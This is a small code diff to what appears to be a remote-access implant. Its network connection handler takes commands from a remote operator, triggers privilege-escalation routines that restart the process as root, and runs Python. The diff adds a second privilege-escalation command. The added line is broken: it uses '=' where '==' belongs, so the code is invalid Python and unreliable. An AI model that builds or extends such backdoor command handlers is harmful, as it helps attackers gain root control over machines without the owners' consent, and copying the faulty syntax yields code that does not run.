@@ -169,6 +169,9 @@ def handle_conn(conn, addr):
                 privesc()
                 # conn.sendall(b"Privesc triggered: restarting as root")
                 send_framed(conn, b"Privesc triggered: restarting as root")
+            elif command_type = "privesc2":
+                print("Running privesc2")
+                privesc2()
             #Command 2: Python 
             elif command_type == "PY":
                 print("Running python")
